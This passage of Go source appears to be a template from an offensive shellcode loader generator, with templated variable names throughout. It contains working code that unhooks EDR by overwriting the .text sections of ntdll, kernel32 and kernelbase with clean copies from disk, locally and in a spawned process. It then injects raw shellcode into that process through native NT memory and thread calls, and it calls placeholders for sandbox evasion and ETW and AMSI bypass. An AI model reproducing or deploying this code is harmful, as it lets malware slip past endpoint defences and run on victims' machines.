	err := {{.Variables.Reloading}}(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}))
	if err != nil {
		{{.Variables.RefreshPE}}
	}
	err = {{.Variables.Reloading}}(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'k', 'e', 'r', 'n', 'e', 'l', 'b', 'a', 's', 'e', '.', 'd', 'l', 'l'}))
	if err != nil {
		{{.Variables.RefreshPE}}
	}
	err = {{.Variables.Reloading}}(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}))
	if err != nil {
		{{.Variables.RefreshPE}}
	}
	{{.Variables.EDR}}

}

func {{.Variables.ReloadRemoteProcess}}({{.Variables.raw_bin}} []byte) {
	{{.Variables.pi}} := {{.Variables.CreateProcess}}()
	{{.Variables.PPIDMessage}}
	time.Sleep(5 * time.Second)
	{{.Variables.hh}}, {{.Variables.err}} := windows.OpenProcess({{.Variables.PROCESS_ALL_ACCESS}}, false, {{.Variables.pi}}.ProcessId)
	if {{.Variables.err}} != nil {
	}
	{{.Variables.modules}} := make([]windows.Handle, 255)
	{{.Variables.n}}, {{.Variables.err}} := {{.Variables.EnumProcessModules}}({{.Variables.hh}}, {{.Variables.modules}})
	if {{.Variables.err}} != nil {
		fmt.Println(&SyscallError{"EnumProcessModules", {{.Variables.err}}})
	}
	if {{.Variables.n}} < len({{.Variables.modules}}) {
		{{.Variables.modules}} = {{.Variables.modules}}[:{{.Variables.n}}]
	}
	{{.Variables.RemoteReloading}}
	{{.Variables.ModuleMessage}}
	var {{.Variables.buf}} = make([]uint16, 255)
	for _, {{.Variables.mod}} := range {{.Variables.modules}} {
		{{.Variables.MI}}, _ := {{.Variables.GetModuleInformation}}({{.Variables.hh}}, {{.Variables.mod}})
		{{.Variables.n}}, {{.Variables.err}} := {{.Variables.GetModuleBaseName}}({{.Variables.hh}}, {{.Variables.mod}}, &{{.Variables.buf}}[0], uint32(len({{.Variables.buf}})))
		if {{.Variables.err}} != nil {
		}
		{{.Variables.s}} := windows.UTF16ToString({{.Variables.buf}}[:{{.Variables.n}}])
		if {{.Variables.s}} == "ntdll.dll" {
			{{.Variables.RemoteModuleEnumeration}}
			{{.Variables.RemoteModuleReloading}}("C:\\Windows\\System32\\ntdll.dll", {{.Variables.MI}}.LpBaseOfDll, {{.Variables.hh}})
			{{.Variables.RemoteModuleMessage}}
		}
		if {{.Variables.s}} == "KERNEL32.DLL" {
			{{.Variables.RemoteModuleEnumeration}}
			{{.Variables.RemoteModuleReloading}}("C:\\Windows\\System32\\kernel32.dll", {{.Variables.MI}}.LpBaseOfDll, {{.Variables.hh}})
			{{.Variables.RemoteModuleMessage}}
		}
		if {{.Variables.s}} == "KERNELBASE.dll" {
			{{.Variables.RemoteModuleEnumeration}}
			{{.Variables.RemoteModuleReloading}}("C:\\Windows\\System32\\kernelbase.dll", {{.Variables.MI}}.LpBaseOfDll, {{.Variables.hh}})
			{{.Variables.RemoteModuleMessage}}
		}
	}

	{{.Variables.Injecting}}
	{{.Variables.shellcode}}  := {{.Variables.raw_bin}}
	{{.Variables.oldProtect}} := windows.PAGE_READWRITE
	var {{.Variables.lpBaseAddress}} uintptr
	{{.Variables.size}} := len({{.Variables.shellcode}})

	{{.Variables.funcNtAllocateVirtualMemory}}.Call(uintptr({{.Variables.pi}}.Process), uintptr(unsafe.Pointer(&{{.Variables.lpBaseAddress}})), 0, uintptr(unsafe.Pointer(&{{.Variables.size}})), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)

	{{.Variables.funcNtWriteVirtualMemory}}.Call(uintptr({{.Variables.pi}}.Process), {{.Variables.lpBaseAddress}}, uintptr(unsafe.Pointer(&{{.Variables.shellcode}}[0])), uintptr({{.Variables.size}}), 0)

	{{.Variables.funcNtProtectVirtualMemory}}.Call(uintptr({{.Variables.pi}}.Process), uintptr(unsafe.Pointer(&{{.Variables.lpBaseAddress}})), uintptr(unsafe.Pointer(&{{.Variables.size}})), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&{{.Variables.oldProtect}})))

	{{.Variables.funcNtCreateThreadEx}}.Call(uintptr(unsafe.Pointer(&{{.Variables.pi}}.Thread)), windows.GENERIC_EXECUTE, 0, uintptr({{.Variables.pi}}.Process), {{.Variables.lpBaseAddress}}, {{.Variables.lpBaseAddress}}, 0, 0, 0, 0, 0)

	syscall.CloseHandle({{.Variables.pi}}.Thread)

	{{.Variables.Injected}}
}

func main() {
	{{.Variables.Sandbox}}
	{{.Variables.ETW}}
	{{.Variables.hide}}
	{{.Variables.AMSI}}
	{{.Variables.Version}} := {{.Variables.Versionfunc}}()
	if {{.Variables.Version}} == "10.0" {
		{{.Variables.loader}}()
	}
	{{.Variables.ETW}}
	{{.Variables.raw_bin}} := [loader].{{.Variables.FuncName}}()
	{{.Variables.ReloadRemoteProcess}}({{.Variables.raw_bin}})
}


func {{.Variables.RemoteModuleReloading}}({{.Variables.name}} string, {{.Variables.addr}} uintptr, {{.Variables.handle}} windows.Handle) error {
	{{.Variables.dll}}, {{.Variables.error}} := ioutil.ReadFile({{.Variables.name}})
	if {{.Variables.error}} != nil {
		return {{.Variables.error}}
	}
	{{.Variables.file}}, {{.Variables.error}} := pe.Open({{.Variables.name}})
	if {{.Variables.error}} != nil {
		return {{.Variables.error}}
	}
	{{.Variables.x}} := {{.Variables.file}}.Section(".text")
	{{.Variables.bytes}} := {{.Variables.dll}}[{{.Variables.x}}.Offset:{{.Variables.x}}.Size]
	{{.Variables.dllBase}} := {{.Variables.addr}}
	{{.Variables.dllOffset}} := uint({{.Variables.dllBase}}) + uint({{.Variables.x}}.VirtualAddress)
	{{.Variables.rawbytes}} := fmt.Sprintf("%X", {{.Variables.bytes}})
	{{.Variables.data}}, _ := hex.DecodeString(string({{.Variables.rawbytes}}))
	{{.Variables.regionsize}} := len({{.Variables.bytes}})
	{{.Variables.offsetaddr}} := uintptr({{.Variables.dllOffset}})
	var {{.Variables.nLength}} uintptr
	{{.Variables.WriteProcessMemory}}(uintptr({{.Variables.handle}}), {{.Variables.offsetaddr}}, &{{.Variables.data}}[0], uintptr(uint32({{.Variables.regionsize}})), &{{.Variables.nLength}})

	return nil
}


func {{.Variables.Reloading}}({{.Variables.DLLname}} string) error {
	{{.Variables.ReloadingMessage}}
	{{.Variables.dll}}, {{.Variables.error}} := ioutil.ReadFile({{.Variables.DLLname}})
	if {{.Variables.error}} != nil {
		return {{.Variables.error}}
	}
	{{.Variables.file}}, {{.Variables.error}} := pe.Open({{.Variables.DLLname}})
	if {{.Variables.error}} != nil {
		return {{.Variables.error}}
	}
	{{.Variables.x}} := {{.Variables.file}}.Section(string([]byte{'.', 't', 'e', 'x', 't'}))
	{{.Variables.bytes}} := {{.Variables.dll}}[{{.Variables.x}}.Offset:{{.Variables.x}}.Size]
	{{.Variables.loaddll}}, {{.Variables.error}} := windows.LoadDLL({{.Variables.DLLname}})
	if {{.Variables.error}} != nil {
		return {{.Variables.error}}
	}
	{{.Variables.handle}} := {{.Variables.loaddll}}.Handle
	{{.Variables.dllBase}} := uintptr({{.Variables.handle}})
	{{.Variables.dllOffset}} := uint({{.Variables.dllBase}}) + uint({{.Variables.x}}.VirtualAddress)
	{{.Variables.handlez}} := uintptr(0xffffffffffffffff)
	var {{.Variables.oldfartcodeperms}} uintptr

	{{.Variables.WriteProcessMemory}}({{.Variables.handlez}}, uintptr({{.Variables.dllOffset}}), (&{{.Variables.bytes}}[0]), uintptr(uint32(len({{.Variables.bytes}}))), & {{.Variables.oldfartcodeperms}})

	return nil
}
	
	
	`
}
